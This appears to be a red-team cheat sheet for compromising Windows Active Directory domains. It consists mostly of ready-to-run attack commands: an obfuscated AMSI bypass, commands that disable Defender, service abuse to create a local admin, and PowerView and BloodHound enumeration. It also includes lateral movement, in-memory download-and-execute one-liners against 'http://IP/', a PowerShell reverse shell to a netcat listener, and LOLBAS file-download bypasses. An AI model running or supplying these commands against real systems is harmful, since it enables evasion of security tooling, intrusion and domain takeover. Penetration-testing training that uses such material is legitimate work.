# RedTeam-CheatSheet From a Windows Host

---

- [CheckLists](#checklists)
  - [Mandatory](#disable-logging-and-enable-bypasses)
  - [Local Privilege Escalation](#privilege-escalation)
  - [Domain Enumeration](#domain-enumeration)
- [Commands](#commands)
  - [Bypass PowerShell Logging](#bypass-logging)
  - [Local Privilege Escalation](#local-privilege-escalation)
  - [Domain-Enumeration](#domain-enumeration-commands)
  - [BloodHound](#bloodHound)
  - [Lateral Movement](#lateral-movement)
  - [Domain Persistence](#bloodHound)
    - [DCsync Attack]
    - [Diamond Ticket]
    - [Golden Ticket]
    - [Silver Ticket]
    - [Skeleton Key]
    - [Custom SSP]
  - [Domain Privilege Escalation](#bloodHound)
    - [Kerberoasting]
    - [Constrained Delegation]
    - [Unconstrained Delegation]
  - [Enterprise Admin Escalation and Forest Trust Abuse](#bloodHound)
  - [Lateral Movement](#bloodHound)
- [Living off the land](#living-off-the-land)
  - [Active Directory Built in Commands](#ad-enumeration)

---

# Checklists  
## Disable Logging and Enable Bypasses
> 1. [ ] Bypass logging - Invisishell 
> 2. [ ] Bypass PowerShell AMSI on every new user
> 3. [ ] Bypass Defender (with Admin privs)
> 4. [ ] .NET AMSI bypass (when required)

## Privilege Escalation
> 1. [ ] PowerUp.ps1

## Domain Enumeration
> 1. [ ] Domains, Forests, Trusts, SIDS
> 2. [ ] Users, fake accounts (password or logon count checks)
> 3. [ ] Domain computers
> 4. [ ] Kerberos Policy Information
> 5. [ ] GPO && OU
> 6. [ ] ACL's 
> 7. [ ] Blood-hound
> 8. [ ] SPN

--- 
# Commands  
## Bypass Logging
### Bypass Execution Policy
`powershell -ep bypass`

### Bypass Enhanced Logging
`RunWithRegistryNonAdmin.bat`

### Bypass AMSI 
https://amsi.fail/
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

### Bypass Defender
```
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
```

## Local Privilege Escalation
```
. .\PowerUp.sp1
Invoke-AllChecks
```

### Create local admin user.
`Invoke-ServiceAbuse -Name 'ServiceName' -User domain\username -Password Password123`

### Run a custom command (Disable Defender)
`Invoke-ServiceAbuse -Name 'ServiceName' -Command "Set-MpPreference -DisableRealtimeMonitoring $true"`

## Domain Enumeration Commands 
### Powerview
`. .\PowerView.ps1`

### Get Domain Controller Information
` Get-NetDomainController`
` Get-NetDomainController -Domain domain.local`
Note the domain SID

### Get User Information
#### Get Domain Users
`Get-DomainUser`
`Get-DomainUser | select -ExpandProperty samaccountname`

#### Check for decoy accounts (logon or bad password is 0).
`Get-UserProperty -Properties pwdlastset,logoncount,badpwdcount`  

#### Domain Administrators  
Domain admin group information. Can note the SID.
`Get-DomainGroup -Identity "Domain Admins"

List the members:
`Get-DomainGroupMember -Identity "Domain Admins"`
`Get-DomainGroupMember -Identity "Domain Admins" | select -ExpandProperty MemberName`

#### Enterprise Administrators
`Get-DomainGroupMember -Identity "Enterprise Admins" -Domain domain.local

### OUs
`Get-DomainOU | select -ExpandProperty name`

List computers within a specific OU called test.
`(Get-DomainOU -Identity test).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name`

### GPOs
`Get-DomainGPO`  

`(Get-DomainGPO -Identity test).gplink`  
Take the cn value:  
`Get-DomainGPO -Identity '{XXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXX}`

### ACLs 
ACLs on Domain Admins Group
`Get-DomainObjectACL -Identity "Domain Admins" -ResolveGUIDS -Verbose`

Check for Interesting ACLs with modify rights. GenericWrite GenericALL
`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "username"}`

Check for Interesting ACLs on a group instead of a user
`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "group"}`

### Domains and Trusts 
List all domains in the current Forest: 
`Get-ForestDomain -Verbose`

Map trusts
`Get-DomainTrust`

List External Trusts 
`Get-DomainTrusts | ?{$_.TrustAttributes -eq "FILTER_SIDS"}

--- 

## Bloodhound
### Installation of GUI and Neo4j
https://bloodhound.readthedocs.io/en/latest/installation/windows.html  

### Collectors 
#### Bypass .NET AMSI
First, bypass .NET AMSI 
https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/

Copy and paste into PowerShell 

#### Running Sharphound
`. .\SharpHound.ps1`
`Invoke-BloodHound -CollectionMethod All,LoggedOn -Verbose`
`Invoke-BloodHound -CollectionMethod All -ExcludeDC`

### Ingestor
Upload the collection files into the BloodHound GUI for review.

---

## Lateral Movement
### Find other machines with local admin access 
`. .\Find-PSRemotingLocalAdminAccess.ps1`
`Find-PSREmotingLocalAdminAccess`

### Connect with winrs with our current user
`winrs -r:target-machine cmd`

### Connect with PSSession
`Enter-PSSession target-machine`

### Bypass Script Block Logging from Powershell
`iex (iwr http://IP/sbloggingbypass.txt -UseBasicParsing)`

### Bypass AMSI
Copy/paste AMSI bypass into the tagret powershell

### Find domain admin session on other machines using the compromised host
`iex ((New-Object Net.WebClient).DownloadString('http://IP/PowerView.ps1'))`
`Find-DomainUserLocation`

### Disable Defender on the target machine
`Set-MpPreference -DisableRealtimeMonitoring $true`

### Permissive Policy Checks  
`reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script

---

## Powershell Reverse Shell Command

### Host a reverse shell using HFS  
On attacking machine:  

- Disable the Firewall first.  
- `HFS.exe` and move to file directory where files are  
- Setup listener:  `nc64.exe -nlvp 443`

On target machine:  
- PowerShell one liner to download script and execute in memory.
`powershell iex (iwr -UseBasicParsing http://IP/Invoke-PowerShellTcp.ps1);Power -Reverse -IPAddress IP -Port 443`

---
## Living off the Land
https://lolbas-project.github.io/#  
### Download Remote File Bypass Examples
#### Bitsadmin
`bitsadmin /transfer "import" https://<URL> C:\Users\<user>\output.txt`
#### cmdl32
1. Create a file '_settings.txt_'
```
[Connection Manager]
CMSFile=settings.txt >> settings.txt
ServiceName=WindowsUpdate >> settings.txt
TunnelFile=settings.txt >> settings.txt
[Settings] >> settings.txt
UpdateUrl=<URL of Remote File>
```
2. Run the following commands to download remote file

```
icacls %cd /deny %username%:(OI)(CI)(DE,DC)
set tmp=%cd%
cmdl32 /vpn /lan %cd%\settings.txt
icacls %cd% /remove:d %username%
```
3. Remove icacls
`icacls %cd% /remove:d %username%`

## AD Enumeration
### Domain Controllers
```
# Password Policies
Get-ADDefaultDomainPasswordPolicy
# List DC's
Get-ADDomainController -filter * | select Name, IPv4Address
```
### Organizational Units and Device Searches
```
# Organizational Units (OU's)
Get-ADOrganizationalUnit -Filter 'Name -like "*"' | Format-Table Name, DistinguishableName -A

# Get Computers within the OU's
Get-ADComputer -SearchBase "<OU-String>" -Filter * | Select-Object -ExpandProperty Name
```
### File Shares 
```
# Store devices in an OU into $FileServAD
$FileServAD = Get-ADComputer -SearchBase "OU=Servers,DC=corp,dc=ad" -Filter * | Select-Object -ExpandProperty Name

# Get SMB Shares on all the devices
Invoke-Command -ComputerName $FileServAD -ScriptBlock {Get-SmbShare -Special $false}
```

---
## Local
### Host Information
```
# System Info
sysinfo

#Networking
ipconfig /all
hostname
```

### Users and Groups
```
net users
net user <username>
net localgroups
net localgroup Administrators
```
